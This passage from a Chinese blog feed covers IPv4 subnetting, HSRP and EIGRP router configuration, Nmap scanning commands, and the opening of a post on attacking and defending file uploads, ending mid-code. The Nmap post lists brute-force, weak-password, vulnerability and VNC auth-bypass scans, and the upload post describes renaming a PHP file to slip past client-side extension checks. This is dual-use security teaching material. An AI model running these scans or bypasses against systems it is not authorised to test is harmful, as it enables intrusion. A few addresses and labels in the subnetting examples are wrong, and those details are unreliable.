    <content type="html"><![CDATA[<h1 id="IPV4编址方案："><a href="#IPV4编址方案：" class="headerlink" title="IPV4编址方案："></a>IPV4编址方案：</h1><p>IP地址由32位二进制数组成，这些位被划分为4组，中间用“.”号隔开，每组8位，以十进制数形式表示。分为网络地址和主机地址两个部分。</p><h3 id="IP地址分类："><a href="#IP地址分类：" class="headerlink" title="IP地址分类："></a>IP地址分类：</h3><p><strong>⚫A类网络地址：</strong></p><p>第一个字节的第一位必须为0，第一个字节的取值为0-127</p><p>即：<code>0</code>xxxxxxx    取值范围是：<code>0</code>0000000－<code>0</code>1111111  （0-127）</p><p>例如：1.1.1.1/8       网络号：8位    255.0.0.0</p><p>网络地址：1.0.0.0</p><p>广播地址：1.255.255.255</p><p>网络地址数：2^24</p><p>有效地址：2^24-2</p><p>实际可用的A类网络地址数为：2^7=128</p><p>合法的主机数为：2 ^24-2＝16777214</p><p>私有地址范围：10.0.0.0~10.255.255.255</p><p><code>私有IP地址是一段保留的IP地址。只使用在局域网中，无法在Internet上使用</code></p><p><strong>⚫B类网络地址范围：</strong></p><p>第一个字节的第一位必须是1，且第二位必须是0，第一个字节的取值为128-191</p><p>即：<code>1</code>0000000   取值范围是：<code>1</code>0000000-10111111   （128-191）</p><p>例如：172.16.0.0/16    网络号：16位    255.255.0.0</p><p>网络地址：172.16.0.0</p><p>广播地址：172.16.255.255</p><p>网络地址数：2^16</p><p>有效地址：2^16-2</p><p>实际可用的B类网络地址数为：2^14=16384</p><p>合法的主机数为：2^16-2=65534</p><p>私有地址范围：172.16.0.0~172.31.255.255</p><p><strong>⚫C类网络的地址范围:</strong></p><p>第一个字节的前两位必须是1，且第三位必须是0，第一个字节的取值为192-223</p><p>即：<code>110</code>00000   取值范围是：<code>110</code>00000－11011111  （192-223）</p><p>例如：192.168.1.1/24    网络号：24位    255.255.255.0</p><p>网络地址：192.168.1.0</p><p>广播地址：192.168.1.255</p><p>网络地址数：2^8</p><p>有效地址：2^8-2</p><p>实际可用的C类网络地址数为：2^21=2097152</p><p>合法的主机数为：2^8-2=254</p><p>私有地址范围：192.168.0.0~192.168.255.255</p><p><strong>⚫D类网络的地址范围:</strong></p><p>第一个字节为224-239，用作组播地址。</p><p><strong>⚫E类网络的地址范围：</strong></p><p>第一个字节为240-255，用于科学用途。</p><hr><h3 id="保留的IP地址："><a href="#保留的IP地址：" class="headerlink" title="保留的IP地址："></a>保留的IP地址：</h3><p>1、网络地址全为0：表示当前网络或网段</p><p>2、网络地址全为1：表示所有网络</p><p>3、地址127.0.0.1：保留用于环回测试</p><p>4、节点地址全为0：表示网络地址或指定网络中的任何主机</p><p>5、节点地址全为1：表示指定网络中的所有节点</p><p>6、整个IP地址全为0：思科路由器用它来指定默认路由，也可能表示任何网络</p><p>7、整个IP地址全为1：到当前网络中所有节点的广播，有时称为“全1广播”或限定广播，即：255.255.255.255</p><hr><h3 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h3><p>将大的网络划分成若干个小网络，尽量减少广播风暴，提高网络效率。</p><p><strong>例：</strong>192.168.1.16/27</p><p>​    此网络后缀为/27，借位数为27-24=3，子网数为2^3=8</p><p>​    二进制表示：11111111.11111111.11111111.11100000</p><p>​    子网块大小：256/8=32</p><p>​    子网掩码：255.255.255.(256-32)=255.255.255.224</p><p>​    网络号：192.168.1.0</p><p>​    广播号：192.168.1.31</p><p>​    有效地址范围：192.168.1.1~192.16.1.62</p><p><strong>子网创建步骤：</strong></p><p>​    （1）确定需要的网络ID数</p><p>​               ■ 每个LAN子网一个</p><p>​               ■ 每条广域网连接一个        </p><p>​    （2）确定每个子网所需的主机ID数</p><p>​               ■每个TCP/IP主机一个</p><p>​               ■每个路由器接口一个</p><p>​    （3）根据上述需要，确定如下内容：</p><p>​               ■一个用于整个网络的子网掩码</p><p>​               ■每个物理网段的唯一子网ID</p><p>​               ■每个子网的主机ID范围</p><p><strong>CIDR：</strong></p><p>CIDR（classless inter-domain routing）,无类域间选择，它是ISP用来将大量地址分配给客户的一种方法。</p><p>CIDR值表：    </p><table><thead><tr><th align="left">子网掩码</th><th align="left">后缀</th><th align="left">子网掩码</th><th align="left">后缀</th></tr></thead><tbody><tr><td align="left">255.0.0.0</td><td align="left">/8</td><td align="left">255.255.240.0</td><td align="left">/20</td></tr><tr><td align="left">255.128.0.0</td><td align="left">/9</td><td align="left">255.255.248.0</td><td align="left">/21</td></tr><tr><td align="left">255.192.0.0</td><td align="left">/10</td><td align="left">255.255.252.0</td><td align="left">/22</td></tr><tr><td align="left">255.224.0.0</td><td align="left">/11</td><td align="left">255.255.254.0</td><td align="left">/23</td></tr><tr><td align="left">255.240.0.0</td><td align="left">/12</td><td align="left">255.255.255.0</td><td align="left">/24</td></tr><tr><td align="left">255.248.0.0</td><td align="left">/13</td><td align="left">255.255.255.128</td><td align="left">/25</td></tr><tr><td align="left">255.252.0.0</td><td align="left">/14</td><td align="left">255.255.255.192</td><td align="left">/26</td></tr><tr><td align="left">255.254.0.0</td><td align="left">/15</td><td align="left">255.255.255.224</td><td align="left">/27</td></tr><tr><td align="left">255.255.0.0</td><td align="left">/16</td><td align="left">255.255.255.240</td><td align="left">/28</td></tr><tr><td align="left">255.255.128.0</td><td align="left">/17</td><td align="left">255.255.255.248</td><td align="left">/29</td></tr><tr><td align="left">255.255.192.0</td><td align="left">/18</td><td align="left">255.255.255.252</td><td align="left">/30</td></tr><tr><td align="left">255.255.224.0</td><td align="left">/19</td><td align="left"></td><td align="left"></td></tr></tbody></table><hr><h1 id="VLSM-变长子网掩码-："><a href="#VLSM-变长子网掩码-：" class="headerlink" title="VLSM(变长子网掩码)："></a>VLSM(变长子网掩码)：</h1><h3 id="VLSM网络划分："><a href="#VLSM网络划分：" class="headerlink" title="VLSM网络划分："></a>VLSM网络划分：</h3><p>使用长度不同的子网掩码将网络划分成多个子网，适用于不同类型的网络设计，称为VLSM组网。</p><p> 分类路由选择：RIPv1，IGRP协议</p><p> 无类路由选择：RIPv2，EIGRP，OSPF等协议</p><p><strong>有类路由</strong>：汇总以后地址是标准的A B C类地址掩码 即 255.0.0.0 255.255.0.0 255.255.255.0 （有类路由里 大类网络中 子网码必须一致 这样叫做有类路由 因为有类路由协议不传递子网码信息）　</p><p><strong>无类路由</strong>：汇总以后地址是无类的比如 172.16.12.0/16 -<br>172.16.15.0/16 汇总以后的地址是 172.16.12.0/20 子码 不属于 A B C 3个类别（无类路由是相反的 他传递子网信息所有大类网络中可以使用不同的子网码）</p><p><strong>例：</strong>将192.168.10.0/24网段划分成5个子网，每个子网主机数如下：</p><p>​    网络一：25台    网络二：12台    网络三：10台    </p><p>​    网络四：6台      网络五：2台</p><p>​    步骤：</p><p>​        <code>1、将主机数从大到小排列</code></p><p>​        <code>2、分配子网块大小</code></p><p>​        <code>3、计算子网范围、掩码等</code></p><p>​    网络一的块大小为32能满足条件</p><p>​    网络二的块大小为16能满足条件</p><p>​    网络三的块大小为16能满足条件</p><p>​    网络二的块大小为8能满足条件</p><p>​    网络二的块大小为4能满足条件</p><p>​    然后从192.168.10.0开始分配，块大小越大的越先分配，这样不会造成地址浪费。若从小到大分配，会导致不能连续分配地址，子网与子网之间必须要间隔一段，这一段将不能使用。所以分配地址的时候最好按照子网大小，<code>从大到小</code>分配。</p><h3 id="地址汇总："><a href="#地址汇总：" class="headerlink" title="地址汇总："></a>地址汇总：</h3><p>地址汇总也叫路由聚合，让路由选择协议能够用一个地址通告众多网络。旨在缩小路由器中路由选择表的规模，以节省内存，并缩短IP对路由选择表进行分析以找出前往远程网络的所需时间。</p><p>地址汇总步骤：</p><p>​    1、确定变化位置</p><p>​    2、计算块大小</p><p><strong>例：</strong>192.168.<code>16</code>.0-192.168.<code>31</code>.0</p><p>​    首先确定变化位置在第3字节，然后变化量为31-16=15，则块大小为16能满足。</p><p>​    子网掩码：255.255.(256-16).0=255.255.240.0</p><p>​    后缀：16+4=/20</p><p>​    网络范围：192.168.16.0~192.168.31.0</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;IPV4编址方案：&quot;&gt;&lt;a href=&quot;#IPV4编址方案：&quot; class=&quot;headerlink&quot; title=&quot;IPV4编址方案：&quot;&gt;&lt;/a&gt;IPV4编址方案：&lt;/h1&gt;&lt;p&gt;IP地址由32位二进制数组成，这些位被划分为4组，中间用“.”号隔开，每组8位，以十
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>HSRP热备份路由协议</title>
    <link href="http://yoursite.com/2019/09/23/HSRP/"/>
    <id>http://yoursite.com/2019/09/23/HSRP/</id>
    <published>2019-09-23T02:59:03.529Z</published>
    <updated>2019-08-25T13:38:18.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HSRP（热备份路由协议）："><a href="#HSRP（热备份路由协议）：" class="headerlink" title="HSRP（热备份路由协议）："></a>HSRP（热备份路由协议）：</h1><p><strong>热备份路由协议(HSRP)</strong></p><p>是思科推出的用于建立容错默认网关的专有冗余协议，由RFC 2281进行描述。</p><p><strong>虚拟路由冗余协议(VRRP)</strong></p><p>是基于标准的HSRP替代协议，由IETF标准RFC 3768进行描述。这两种技术在概念上相似，但互不兼容。</p><h3 id="HSRP工作原理："><a href="#HSRP工作原理：" class="headerlink" title="HSRP工作原理："></a>HSRP工作原理：</h3><p>HSRP在网络路由器之间建立默认网关的倒换框架，当主网关不可达时进行切换。此协议经常与快速会聚路由协议EIGRP或OSPF协同工作。HSRP使用多播地址224.0.0.2和UDP端口1985向其他启用HSRP协议的路由器发送HELLO报文，来交流路由器间的优先级。配置有最高优先级的主路由器将成为虚拟路由器，以预先配置好的网关IP和MAC地址0000.0c07.acXX（XX是组IP的十六进制值）回应局域网对网关的ARP的请求。如果主路由器宕机，次优先级路由器将接管网关IP并以同样的MAC地址回应ARP的请求，这样就实现了透明的默认网关自动倒换。</p><p>热备份路由协议确保在某一时间内只有一台路由器（称为主动路由器）以虚拟路由器的名义转发数据包。备份路由器被选择，并时刻准备成为主动路由器（在当前主动路由器失效的情况下）。热备份路由协议定义了一种通过IP地址来确定主动和备份路由器的机制。一旦这些确定了，一个主动路由器出故障就不会出现重大的连接中断现象。</p><p>在任何特定的网络中，可能有多个，也可能是重叠的，热备份群，每一个都有单一的媒体访问控制（MAC）地址和IP地址；IP地址应该属于初级子网，但它必须与实际或虚拟的地址（分配给网络中路由器或主机的地址）不同。</p><p>HSRP和VRRP都不是路由协议，因为它们不发布IP路由也不影响路由表。</p><h3 id="HSRP配置："><a href="#HSRP配置：" class="headerlink" title="HSRP配置："></a>HSRP配置：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#int vlan 10//进入vlan接口</span><br><span class="line">Router(config-if)#ip add 192.168.10.252 255.255.255.0//配置vlan地址</span><br><span class="line">Router(config-if)#standby 10 ip 192.168.10.254//配置虚拟网关</span><br><span class="line">Router(config-if)#standby 10 priority120//配置优先级（默认100）</span><br><span class="line">Router(config-if)#standby 10 preemp//配置抢占</span><br><span class="line">Router(config-if)#standby 10 timers 3 10//配置hello时间，每隔3秒发送一次，一次维持10秒</span><br><span class="line">Router(config-if)#standby 10 track f0/1//配置端口跟踪</span><br></pre></td></tr></table></figure><p><code>因为在一个网络中，vlan的地址不能相同，所以两个相同的vlan使用不同的vlan地址，但是两者都虚拟出同一个地址作为网关</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HSRP（热备份路由协议）：&quot;&gt;&lt;a href=&quot;#HSRP（热备份路由协议）：&quot; class=&quot;headerlink&quot; title=&quot;HSRP（热备份路由协议）：&quot;&gt;&lt;/a&gt;HSRP（热备份路由协议）：&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;热备份路由协议(HSRP)&lt;
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="网络协议" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>EIGRP-增强内部网关路由协议</title>
    <link href="http://yoursite.com/2019/09/23/EIGRP/"/>
    <id>http://yoursite.com/2019/09/23/EIGRP/</id>
    <published>2019-09-23T02:59:03.418Z</published>
    <updated>2019-08-28T03:16:00.268Z</updated>
    
    <content type="html"><![CDATA[<h1 id="EIGRP："><a href="#EIGRP：" class="headerlink" title="EIGRP："></a>EIGRP：</h1><p>EIGRP:Enhanced Interior Gateway Routing Protocol 即 增强内部网关路由协议。也翻译为 加强型内部网关路由协议。 EIGRP是Cisco公司的私有协议（2013年已经公有化）。</p><p>EIGRP结合了链路状态和距离矢量型路由选择协议的Cisco专用协议，采用弥散修正算法（DUAL）来实现快速收敛，可以不发送定期的路由更新信息以减少带宽的占用，支持Appletalk、IP、Novell和NetWare等多种网络层协议。</p><h3 id="EIGRP的特点："><a href="#EIGRP的特点：" class="headerlink" title="EIGRP的特点："></a>EIGRP的特点：</h3><p>高级距离矢量                网络设计灵活</p><p>快速收敛                        用组播和单播地址来代替广播</p><p>无环路的无类路由         支持VLSM和不连续的子网</p><p>配置简单                         在Internet网络中任意点手动汇总</p><p>逐步更新                         支持多种网络层协议</p><p>在开销相等和不相等的路径上实现负载均衡</p><p><code>EIGRP的管理距离为90</code></p><hr><h3 id="EIGRP的关键技术："><a href="#EIGRP的关键技术：" class="headerlink" title="EIGRP的关键技术："></a>EIGRP的关键技术：</h3><p><strong>邻居发现/恢复机制：</strong>在邻居间使用hello报文，配置了EIGRP的路由器会主动建立与邻居的关系，建立邻接使用Hello报文发送每5或60秒。如果邻居错过了连续3个Hello报文的路由将被视为无效。默认值=15秒或180秒。</p><p><strong>可靠传输协议（RTP）：</strong>确保EIGRP报文可靠,有序地传送到所有邻居</p><p><strong>扩散更新算法（DUAL）：</strong>为去往每个目标选择最小开销,无环路的路径</p><p><strong>协议无关模块（PDMs）：</strong>EIGRP支持为IP,Apple Talk,IPX等协议计算路由</p><hr><h3 id="EIGRP内容："><a href="#EIGRP内容：" class="headerlink" title="EIGRP内容："></a>EIGRP内容：</h3><p><strong>EIGRP表：</strong>分别是邻居表、拓扑表、路由表</p><p><strong>AD和FD：</strong></p><p>​    通告距离（AD）：也称报告距离，下一跳路由器到目的地的度量值</p><p>​    可行距离（FD）：是本地路由器到达目的地的度量值</p><p><strong>后继者与可行后继：</strong></p><p>​    后继者（successor）：后继者是一个相邻路由器具有最低成本的路径到目的地（最低FD），是保证不会循环的一部分，后继路由用于转发数据包，如果他们具有相同的FD，可以存在多条相同路径。</p><p>​    可行后继（Feasible successor）：一个可行后继是离目的地很近的邻居，但不是最低开销的，一个可行后继确保一个无环拓扑，因为它的AD必须小于后继的FD。可行后继和后继在同一时间进行选择,但它只保存在拓扑表作为备份路径。拓扑表中可以保存多个可行后继为一个目的地。</p><p><strong>EIGRP Packets：</strong></p><p><img src="https://ftp.bmp.ovh/imgs/2019/08/88267c42f220f072.png" alt></p><p><strong>Initial Route Discovery：</strong></p><p><img src="https://ftp.bmp.ovh/imgs/2019/08/4f04e181dc83260e.png" alt></p><hr><h3 id="EIGRP度量值的计算（metric）："><a href="#EIGRP度量值的计算（metric）：" class="headerlink" title="EIGRP度量值的计算（metric）："></a>EIGRP度量值的计算（metric）：</h3><p>EIGRP使用一个复合度量，可根据以下指标：</p><p><strong>带宽</strong>          使用最小的带宽（BW），</p><p><strong>可靠性</strong>      是衡量一个链接将失败的可能性.</p><p><strong>延迟</strong>          延迟是衡量一个包需要穿越路由的时间.</p><p><strong>负载</strong>          反映了多少流量是使用链接</p><p><strong>MTU</strong>         最大传输单元</p><p><strong>默认情况下使用带宽和延迟！</strong></p><p><strong>metric值计算方法：</strong>metric值=256((10^7/bw)+(dly之和/10))</p><p>​    -bw:最小带宽</p><p>​    -dly:延迟之和，路由传递方向所有入接口的dly值的累加</p><hr><h3 id="EIGRP配置："><a href="#EIGRP配置：" class="headerlink" title="EIGRP配置："></a>EIGRP配置：</h3><p><strong>配置EIGRP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#router eigrp 100//同一个自治系统的eigrp编号要相同</span><br><span class="line">Router(config-router)#network 192.168.1.0//通告直连网络</span><br><span class="line">Router(config-router)#network 192.168.1.0 0.0.0.255//也可加上反掩码</span><br><span class="line">Router(config-router)#no auto-summary//禁用自动总结</span><br><span class="line">Router(config-router)#passive-interface loopback0//配置被动接口</span><br><span class="line">Router(config)#int f0/0</span><br><span class="line">Router(config-if)#ip summary-address eigrp 100 192.168.1.0 255.255.255.0//EIGRP手动路由汇总</span><br></pre></td></tr></table></figure><p><strong>被动接口：</strong>被动接口（passive interface）一般应用于优化，比如在我们的拓扑中R2上有一个环回口lo0:2.2.2.2，向lo0口发送EIGRP报文是没必要的，当我们在EIGRP路由进程下启用lo0的被动接口后，R2将不再向lo0发送任何EIGRP报文，但是lo0的路由还是会被R2发送出去。</p><p><strong>检验EIGRP：</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router#show ip route eigrp//查看路由表</span><br><span class="line">Router#show ip protocols</span><br><span class="line">Router#show ip eigrp interface</span><br><span class="line">Router#show ip eigrp neighbors//查看邻居表</span><br><span class="line">Router#show ip eigrp topology//查看拓扑表</span><br><span class="line">Router#show ip eigrp traffic</span><br></pre></td></tr></table></figure><hr><h3 id="EIGRP负载均衡："><a href="#EIGRP负载均衡：" class="headerlink" title="EIGRP负载均衡："></a>EIGRP负载均衡：</h3><p>等价负载均衡默认支持4条，不同IOS版本不同</p><p>v值计算方法：V&gt;FS/S,结果向上取整</p><p>配置方法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#router eigrp 100//进入EIGRP100</span><br><span class="line">Router(config-router)#Variance 2//配置非等价负载均衡，V值为2</span><br></pre></td></tr></table></figure><hr><h3 id="EIGRP-MD5身份验证："><a href="#EIGRP-MD5身份验证：" class="headerlink" title="EIGRP MD5身份验证："></a>EIGRP MD5身份验证：</h3><p>EIGRP支持MD5身份验证，路由器对每个它发送的EIGRP数据包进行自我标识。路由器验证接收到的每个路由更新数据包的来源，每个参与的邻居都必须配置相同的密钥。</p><p><strong>配置步骤：</strong></p><p>1、创建密钥链，它是一组可能的密钥（密码）</p><p>2、对每个密钥分配密钥ID</p><p>3、标识密钥</p><p>4、指定密钥的有效期（可选）</p><p>5、在接口上启用MD5身份验证</p><p>6、指定接口使用的密钥链</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Router(config)#key chain key1     //进入密钥链配置模式,密钥链名为key1</span><br><span class="line">Router(config-keychain)#key 1       //标识密钥并进入密钥ID的配置模式，密钥ID为1</span><br><span class="line">Router(config-keychain-key)#key-string 123  //标识密钥字符串（密码）</span><br><span class="line">Router(config)#int f0/1//进入接口</span><br><span class="line">Router(config-if)#ip authentication mode eigrp autonomous-system md5  //为EIGRP数据包指定MD5身份验证</span><br><span class="line">Router(config-if)#ip authentication key-chain eigrp autonomous-system key1//使用密钥链中的密钥来启用EIGRP数据包的身份验证</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;EIGRP：&quot;&gt;&lt;a href=&quot;#EIGRP：&quot; class=&quot;headerlink&quot; title=&quot;EIGRP：&quot;&gt;&lt;/a&gt;EIGRP：&lt;/h1&gt;&lt;p&gt;EIGRP:Enhanced Interior Gateway Routing Protocol 即 增强内
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络设计及扩展" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%89%A9%E5%B1%95/"/>
    
      <category term="路由协议" scheme="http://yoursite.com/tags/%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
  <entry>
    <title>Nmap基本使用命令</title>
    <link href="http://yoursite.com/2019/09/23/Nmap%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2019/09/23/Nmap基本使用命令/</id>
    <published>2019-09-23T02:58:39.994Z</published>
    <updated>2019-08-16T11:43:40.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nmap基础命令："><a href="#Nmap基础命令：" class="headerlink" title="Nmap基础命令："></a>Nmap基础命令：</h1><h5 id="扫描单个IP："><a href="#扫描单个IP：" class="headerlink" title="扫描单个IP："></a>扫描单个IP：</h5><p><code>nmap 172.16.13.12</code></p><h5 id="扫描多个IP："><a href="#扫描多个IP：" class="headerlink" title="扫描多个IP："></a>扫描多个IP：</h5><p><code>nmap 172.16.13.12 172.16.13.13</code></p><h5 id="扫描一个范围的目标地址："><a href="#扫描一个范围的目标地址：" class="headerlink" title="扫描一个范围的目标地址："></a>扫描一个范围的目标地址：</h5><p><code>nmap 172.16.13.12-15</code></p><h5 id="扫描一个网段的目标地址："><a href="#扫描一个网段的目标地址：" class="headerlink" title="扫描一个网段的目标地址："></a>扫描一个网段的目标地址：</h5><p><code>nmap 172.16.13.0/24</code></p><h5 id="扫描target-txt中主机列表中的地址："><a href="#扫描target-txt中主机列表中的地址：" class="headerlink" title="扫描target.txt中主机列表中的地址："></a>扫描target.txt中主机列表中的地址：</h5><p><code>nmap -iL target.txt</code></p><h5 id="扫描除了某一目标之外的其它地址："><a href="#扫描除了某一目标之外的其它地址：" class="headerlink" title="扫描除了某一目标之外的其它地址："></a>扫描除了某一目标之外的其它地址：</h5><p><code>nmap 172.16.13.0/24 -exclude 172.16.13.62</code></p><h5 id="扫描除了某一文件中的地之外的其它地址："><a href="#扫描除了某一文件中的地之外的其它地址：" class="headerlink" title="扫描除了某一文件中的地之外的其它地址："></a>扫描除了某一文件中的地之外的其它地址：</h5><p><code>nmap 172.16.13.0/24 -excludefile target.txt</code></p><h5 id="扫描目标地址的某些端口："><a href="#扫描目标地址的某些端口：" class="headerlink" title="扫描目标地址的某些端口："></a>扫描目标地址的某些端口：</h5><p><code>nmap 172.16.13.62 -p 21,22,23,24</code></p><h5 id="对目标地址进行路由跟踪："><a href="#对目标地址进行路由跟踪：" class="headerlink" title="对目标地址进行路由跟踪："></a>对目标地址进行路由跟踪：</h5><p><code>nmap -traceroute 172.16.13.12</code></p><h5 id="扫描在线主机："><a href="#扫描在线主机：" class="headerlink" title="扫描在线主机："></a>扫描在线主机：</h5><p><code>nmap -sP 172.16.13.0/24</code></p><h5 id="目标地址操作系统识别："><a href="#目标地址操作系统识别：" class="headerlink" title="目标地址操作系统识别："></a>目标地址操作系统识别：</h5><p><code>nmap -O 172.16.13.12</code></p><h5 id="目标地址提供的服务版本："><a href="#目标地址提供的服务版本：" class="headerlink" title="目标地址提供的服务版本："></a>目标地址提供的服务版本：</h5><p><code>nmap -sV 172.16.13.12</code></p><h5 id="探测目标防火墙状态："><a href="#探测目标防火墙状态：" class="headerlink" title="探测目标防火墙状态："></a>探测目标防火墙状态：</h5><p><code>nmap -sF -T4 172.16.13.12</code></p><h1 id="Nmap进阶命令："><a href="#Nmap进阶命令：" class="headerlink" title="Nmap进阶命令："></a>Nmap进阶命令：</h1><h5 id="扫描弱口令："><a href="#扫描弱口令：" class="headerlink" title="扫描弱口令："></a>扫描弱口令：</h5><p><code>nmap -script=auth 172.16.13.12</code></p><h5 id="暴力破解："><a href="#暴力破解：" class="headerlink" title="暴力破解："></a>暴力破解：</h5><p><code>nmap -script=brute 172.16.13.12</code></p><h5 id="扫描常见漏洞："><a href="#扫描常见漏洞：" class="headerlink" title="扫描常见漏洞："></a>扫描常见漏洞：</h5><p><code>nmap -script=vuln 172.16.13.12</code></p><h5 id="使用脚本进行应用服务扫描："><a href="#使用脚本进行应用服务扫描：" class="headerlink" title="使用脚本进行应用服务扫描："></a>使用脚本进行应用服务扫描：</h5><p><code>nmap -script=realvnc-auth-bypass 172.16.13.12</code></p><h5 id="探测局域网服务开放状态："><a href="#探测局域网服务开放状态：" class="headerlink" title="探测局域网服务开放状态："></a>探测局域网服务开放状态：</h5><p><code>nmap -script=broadcast 172.16.13.12</code></p><h5 id="Whois解析："><a href="#Whois解析：" class="headerlink" title="Whois解析："></a>Whois解析：</h5><p><code>nmap -script external baidu.com</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nmap基础命令：&quot;&gt;&lt;a href=&quot;#Nmap基础命令：&quot; class=&quot;headerlink&quot; title=&quot;Nmap基础命令：&quot;&gt;&lt;/a&gt;Nmap基础命令：&lt;/h1&gt;&lt;h5 id=&quot;扫描单个IP：&quot;&gt;&lt;a href=&quot;#扫描单个IP：&quot; class=&quot;he
      
    
    </summary>
    
      <category term="系统安全" scheme="http://yoursite.com/categories/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="工具使用" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
      <category term="漏洞扫描" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
  <entry>
    <title>文件上传漏洞攻击及防御</title>
    <link href="http://yoursite.com/2019/08/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1/"/>
    <id>http://yoursite.com/2019/08/15/文件上传漏洞的攻击与防御/</id>
    <published>2019-08-15T12:02:56.178Z</published>
    <updated>2019-08-16T00:12:48.976Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端限制："><a href="#前端限制：" class="headerlink" title="前端限制："></a>前端限制：</h1><h4 id="前端代码："><a href="#前端代码：" class="headerlink" title="前端代码："></a>前端代码：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line"></span><br><span class="line">        var filename=document.getElementById(&quot;file&quot;);</span><br><span class="line"></span><br><span class="line">        var str=filename.value.split(&quot;.&quot;);</span><br><span class="line"></span><br><span class="line">        var ext=str[str.length-1];</span><br><span class="line"></span><br><span class="line">        if(ext==&apos;jpg&apos;||ext==&apos;png&apos;||ext==&apos;jpeg&apos;||ext==&apos;gif&apos;)&#123;</span><br><span class="line"></span><br><span class="line">            return true;</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line"></span><br><span class="line">            alert(&quot;请上传图片格式文件&quot;)</span><br><span class="line"></span><br><span class="line">            return false;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return false;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>在表单中使用onsumbit=check()调用js函数来检查上传文件的扩展名。这种限制实际上没有任何用处，任何攻击者都可以轻而易举的破解。只能用于对于用户完全信任的情况下，很难称之为一种安全措施只能称之是一种防止用户误操作上传的措施。</p><h4 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h4><p>当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p><h4 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h4><p>1、绕过前台脚本检测扩展名，就是将所要上传文件的扩展名更改为符合脚本检测规则的扩展名，通过BurpSuite工具，截取数据包，并将数据包中文件扩展名更改回原来的，达到绕过的目的。<br>例如:文件名本来为【evil.jpg】，上传时，用BurpSuite截包后，将数据包中的名字改为【evil.php】(或其它脚本类型)即可。</p><p>2、如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现。</p><h1 id="检查扩展名"><a href="#检查扩展名" class="headerlink" title="检查扩展名:"></a>检查扩展名:</h1><p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传<br>在检查扩展名是否合法的时候，有两种策略:</p><p>1、黑名单策略，文件扩展名在黑名单中的为不合法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$postfix = end(explode(&apos;.&apos;,&apos;$_POST[&apos;filename&apos;]);</span><br><span class="line"></span><br><span class="line">if($postfix==&apos;php&apos;||$postfix==&apos;asp&apos;||$postfix==&apos;sh&apos;)&#123;</span><br><span class="line"></span><br><span class="line">  echo &quot;invalid file type&quot;;</span><br><span class="line"></span><br><span class="line">  return;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、白名单策略，文件扩展名不在白名单中的均为不合法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$postfix = end(explode(&apos;.&apos;,&apos;$_POST[&apos;filename&apos;]);</span><br><span class="line"></span><br><span class="line">if($postfix==&apos;jpg&apos;||$postfix==&apos;png&apos;||$postfix==&apos;gif&apos;)&#123;</span><br><span class="line"></span><br><span class="line">  //save the file and do something next</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line"></span><br><span class="line">  echo 